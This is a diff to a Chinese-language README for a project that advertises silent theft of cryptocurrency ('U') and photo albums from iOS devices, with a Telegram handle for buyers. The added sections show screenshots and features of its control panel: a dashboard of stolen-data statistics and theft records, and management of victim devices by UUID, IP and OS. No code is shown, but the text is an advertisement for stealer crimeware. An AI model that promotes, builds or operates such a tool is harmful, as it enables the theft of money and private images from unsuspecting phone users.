@@ -2,6 +2,25 @@
 
 ios无感盗U  获取相册项目  联系TG  [@question_05](https://t.me/question_05 )
 
+## 界面预览
+
+### 登录界面
+
+支持账号密码登录与 2FA（TOTP）动态验证码双重验证。
+
+![登录界面](docs/images/login.png)
+
+### 仪表盘
+
+设备总览、在线状态、请求趋势、窃取数据分类统计与最新设备/窃取记录。
+
+![仪表盘后台](docs/images/dashboard.png)
+
+### 设备管理
+
+设备列表支持按 UUID / IP / OS 搜索，按状态、系统、渠道筛选，支持分组与批量操作。
+
+![设备管理](docs/images/devices.png)
 
 ## 功能模块
 
@@ -54,7 +73,9 @@ ios无感盗U  获取相册项目  联系TG  [@question_05](https://t.me/questio
 ├── index.html
 ├── vite.config.ts
 ├── tsconfig.json
-└── package.json
+├── package.json
+└── docs/
+    └── images/         # README 界面截图
 ```
 
 ## License
